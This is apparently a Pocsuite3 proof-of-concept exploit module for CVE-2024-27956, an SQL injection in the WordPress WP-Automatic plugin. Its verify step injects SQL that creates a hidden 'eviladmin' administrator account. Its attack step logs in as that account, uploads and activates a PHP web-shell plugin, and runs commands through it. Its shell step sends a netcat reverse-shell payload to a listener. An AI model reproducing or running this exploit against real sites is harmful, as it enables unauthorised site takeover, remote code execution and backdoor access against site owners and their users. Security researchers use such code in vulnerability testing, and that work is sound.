from pocsuite3.api import POCBase, register_poc, Output, OptDict, OptString, OrderedDict
from pocsuite3.api import get_listener_ip, get_listener_port, REVERSE_PAYLOAD, random_str
import requests
from bs4 import BeautifulSoup
import zipfile
import io
from string import ascii_lowercase
from random import choice
import urllib.parse
import re

class CVE202427956POC(POCBase):
    vulID = 'CVE-2024-27956'
    version = '1.0'
    author = ['Pocsuite3']
    vulDate = '2024-04-30'
    createDate = '2025-07-10'
    updateDate = '2025-07-11'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956']
    name = 'WordPress WP-Automatic Plugin SQL Injection Vulnerability CVE-2024-27956'
    appPowerLink = 'https://wordpress.org/plugins/wp-automatic/'
    appName = 'WordPress WP-Automatic Plugin'
    appVersion = '<= 3.9.2'
    vulType = 'SQL Injection'
    category = ''
    desc = '''
        This PoC exploits CVE-2024-27956, an SQL injection vulnerability in the WordPress WP-Automatic plugin (<= 3.9.2).
        It creates an admin user in verify, then uses it in attack to log in and upload a malicious plugin with a web shell for RCE.
    '''
    samples = []

    def _make_request(self, payload, hash, url, session=None):
        if session is None:
            session = requests
        host = url.split('/', 3)[2]
        headers = {
            'Host': host,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-type': 'application/x-www-form-urlencoded',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        data = {
            'q': payload,
            'auth': b'\0',
            'integ': hash
        }
        try:
            response = session.post(url, data=data, headers=headers, verify=False, timeout=15)
            return response, None
        except requests.exceptions.RequestException as e:
            return None, f"Request failed: {e}"

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('whoami', description='Command execution', require=True)
        return o
    
    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + '/wp-content/plugins/wp-automatic/inc/csv.php'
        payload = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')"
        hash_value = "09956ea086b172d6cf8ac31de406c4c0"

        response, error = self._make_request(payload, hash_value, url)
        if response is None:
            result['Error'] = error or "Failed to connect to the endpoint"
            return self.parse_output(result)

        if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
            result['Error'] = "Error in the payload"
            return self.parse_output(result)

        if "DATE" not in response.text:
            result['Error'] = "Not vulnerable"
            return self.parse_output(result)

        payload = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'eviladmin'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')"
        hash_value = "bd98494b41544b818fa9f583dadfa2bb"
        response, error = self._make_request(payload, hash_value, url)

        if response is None:
            result['Error'] = error or "Failed to connect to the endpoint"
            return self.parse_output(result)

        if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
            result['Error'] = "Error in the payload"
            return self.parse_output(result)

        if "DATE" in response.text:
            result['VerifyInfo'] = {
                'URL': url,
                'Status': 'Target is vulnerable',
                'Credentials': 'eviladmin:admin'
            }
        else:
            result['Error'] = "Not vulnerable"

        return self.parse_output(result)

    def _attack(self):
        base_url = self.url.rstrip('/')
        login_url = f"{base_url}/wp-login.php"
        admin_url = f"{base_url}/wp-admin/"
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-plugin"
        plugins_url = f"{base_url}/wp-admin/plugins.php"
        
        session = requests.Session()
        
        try:
            login_page = session.get(login_url, verify=False, timeout=15)
            login_page.raise_for_status()
            nonce = BeautifulSoup(login_page.content, 'html.parser').find('input', {'name': '_wpnonce'})
            nonce = nonce['value'] if nonce else ''
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to fetch login page: {e}"})

        login_data = {
            "log": "eviladmin",
            "pwd": "admin",
            "wp-submit": "Log In",
            "redirect_to": admin_url,
            "testcookie": "1",
            "security": nonce
        }
        try:
            response = session.post(login_url, data=login_data, verify=False, timeout=15)
            response.raise_for_status()
            admin_page = session.get(admin_url, verify=False, timeout=15)
            admin_page.raise_for_status()
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Login failed: {e}"})

        plugin_dir = "myplugin"
        webshell_payload = """<?php
    /**
    * Plugin Name: My Plugin
    * Version: 1.0
    * Author: Test
    */
    if(isset($_GET['cmd'])) {
        system($_GET['cmd'] . ' 2>&1');
    }
    ?>"""

        # Check if plugin already exists
        try:
            plugins_page = session.get(plugins_url, verify=False, timeout=15)
            plugins_page.raise_for_status()
            plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
            plugin_row = plugins_soup.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
            if plugin_row and 'inactive' not in plugin_row.get('class', []):
                # Plugin exists and is active, skip to command execution
                cmd = self.get_option('cmd')
                cmd_output = None
                if cmd:
                    rce_url = f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={cmd}"
                    try:
                        cmd_response = session.get(rce_url, verify=False, timeout=20)
                        cmd_response.raise_for_status()
                        cmd_output = cmd_response.text.strip().split('\n')[0]
                    except requests.exceptions.RequestException as e:
                        cmd_output = None

                result = {
                    'AttackInfo': {
                        'Upload_Status': 'Skipped (Plugin already exists)',
                        'Activation_Status': 'Skipped (Plugin already active)',
                        'Web_Shell_URL': f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={cmd}",
                        'Web_Shell_Status': 'Command executed' if cmd_output else 'Command execution failed',
                        'Command_Output': cmd_output
                    }
                }
                return self.parse_output(result)
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to check plugins page: {e}"})

        # Plugin does not exist or is not active, proceed with upload
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr(f"{plugin_dir}/web_shell.php", webshell_payload)
        zip_buffer.seek(0)

        try:
            upload_page = session.get(f"{base_url}/wp-admin/plugin-install.php?tab=upload", verify=False, timeout=15)
            upload_page.raise_for_status()
            upload_soup = BeautifulSoup(upload_page.content, 'html.parser')
            nonce_input = upload_soup.find('input', {'name': '_wpnonce'})
            if not nonce_input or 'value' not in nonce_input.attrs:
                return self.parse_output({'Error': f"Failed to fetch upload nonce: {upload_page.status_code}"})
            upload_nonce = nonce_input['value']
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Failed to fetch plugin upload page: {e}"})

        files = {
            'pluginzip': ("myplugin.zip", zip_buffer, 'application/zip'),
            'install-plugin-submit': (None, 'Install Now')
        }
        upload_data = {
            '_wpnonce': upload_nonce,
            '_wp_http_referer': f"{base_url}/wp-admin/plugin-install.php?tab=upload",
            'install-plugin-submit': 'Install Now'
        }
        try:
            upload_response = session.post(upload_url, files=files, data=upload_data, verify=False, timeout=20)
            upload_response.raise_for_status()
            upload_status = "Success" if 'Plugin installed successfully' in upload_response.text or upload_response.status_code == 200 else "Failed"
            if upload_status == "Failed":
                return self.parse_output({'Error': f"Plugin upload failed: {upload_response.text[:100]}..."})
        except requests.exceptions.RequestException as e:
            return self.parse_output({'Error': f"Plugin upload failed: {e}"})

        activation_status = "Failed"
        try:
            plugins_page = session.get(plugins_url, verify=False, timeout=15)
            plugins_page.raise_for_status()
            plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
            plugin_row = plugins_soup.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
            if plugin_row:
                activate_link = plugin_row.find('a', {'id': 'activate-my-plugin'})
                if activate_link and '_wpnonce' in activate_link['href']:
                    nonce_match = re.search(r'_wpnonce=([a-z0-9]+)', activate_link['href'])
                    activate_nonce = nonce_match.group(1) if nonce_match else None
                    if activate_nonce:
                        encoded_plugin_path = urllib.parse.quote(f"{plugin_dir}/web_shell.php")
                        activate_url = f"{base_url}/wp-admin/plugins.php?action=activate&plugin={encoded_plugin_path}&_wpnonce={activate_nonce}"
                        activate_response = session.get(activate_url, verify=False, timeout=20, allow_redirects=True)
                        
                        if activate_response.status_code in (200, 302):
                            plugins_page_after = session.get(plugins_url, verify=False, timeout=15)
                            plugins_page_after.raise_for_status()
                            plugins_soup_after = BeautifulSoup(plugins_page_after.content, 'html.parser')
                            plugin_row_after = plugins_soup_after.find('tr', {'data-plugin': f"{plugin_dir}/web_shell.php"})
                            if plugin_row_after and 'inactive' not in plugin_row_after.get('class', []):
                                activation_status = "Success"
                            else:
                                activation_status = f"Failed: Plugin not active - {activate_response.text[:100]}"
                        else:
                            activation_status = f"Failed: HTTP status {activate_response.status_code} - {activate_response.text[:100]}"
                    else:
                        activation_status = "Failed: Could not extract activation nonce"
                else:
                    activation_status = "Failed: Could not find activation link"
            else:
                activation_status = "Failed: Could not find plugin row"
        except requests.exceptions.RequestException as e:
            activation_status = f"Failed: Error fetching plugins page - {str(e)}"
        except Exception as e:
            activation_status = f"Failed: Unexpected error - {str(e)}"

        cmd = self.get_option('cmd')
        cmd_output = None
        if cmd:
            rce_url = f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={cmd}"
            try:
                cmd_response = session.get(rce_url, verify=False, timeout=20)
                cmd_response.raise_for_status()
                cmd_output = cmd_response.text.strip().split('\n')[0]
            except requests.exceptions.RequestException as e:
                cmd_output = None

        result = {
            'AttackInfo': {
                'Upload_Status': upload_status,
                'Activation_Status': activation_status,
                'Web_Shell_URL': f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php?cmd={cmd}",
                'Web_Shell_Status': 'Command executed' if cmd_output else 'Command execution failed',
                'Command_Output': cmd_output
            }
        }
        return self.parse_output(result)

    def _shell(self):
        result = {}
        web_shell_url = self.url.rstrip('/') + '/wp-content/plugins/myplugin/web_shell.php'
        
        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        encoded_payload = urllib.parse.quote(cmd)
        
        try:
            rce_url = f"{web_shell_url}?cmd={encoded_payload}"
            response = requests.get(rce_url, verify=False, timeout=20)
            response.raise_for_status()
            
            result['ShellInfo'] = {
                'Web_Shell_URL': rce_url,
                'Status': 'Reverse shell executed successfully',
                'Listener': f"{get_listener_ip()}:{get_listener_port()}"
            }
        except requests.exceptions.RequestException as e:
            result['Error'] = f"Reverse shell execution "
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(CVE202427956POC)
